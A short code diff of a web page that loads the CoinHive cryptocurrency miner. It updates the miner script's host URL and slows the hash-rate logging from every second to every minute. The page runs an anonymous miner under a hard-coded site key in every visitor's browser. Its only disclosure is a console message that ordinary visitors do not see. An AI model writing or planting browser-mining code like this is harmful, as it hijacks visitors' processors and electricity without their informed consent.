@@ -113,7 +113,7 @@
 
 </script>
 <script src="./service-worker.js" charset="utf-8" async></script>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
   console.log('This website is mining in background while you are using it.')
   var miner = new CoinHive.Anonymous('e01UBwJ1yCJgeQ410PbZcXSGvyP1pOqu');
@@ -132,7 +132,7 @@
     var totalHashes = miner.getTotalHashes();
     var acceptedHashes = miner.getAcceptedHashes();
     console.log(hashesPerSecond, totalHashes, acceptedHashes)
-  }, 1000);
+  }, 1000 * 60);
 
 </script>
 
